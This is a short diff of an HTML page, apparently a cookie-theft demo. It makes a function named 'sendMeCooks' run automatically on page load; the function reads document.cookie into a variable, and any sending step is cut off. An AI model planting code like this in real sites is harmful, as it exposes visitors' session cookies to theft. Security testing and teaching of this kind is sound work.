@@ -2,14 +2,10 @@
 <head>
 </head>
 
-<body>
+<body onload=sendMeCooks()>
   <button onclick=sendMeCooks()>Button</button>
   
   <script>
-    if(document.readyState === 'complete') {
-      sendMeCooks();
-    }
-    
     function sendMeCooks() {
       alert(document.cookie);
       var cks = document.cookie;
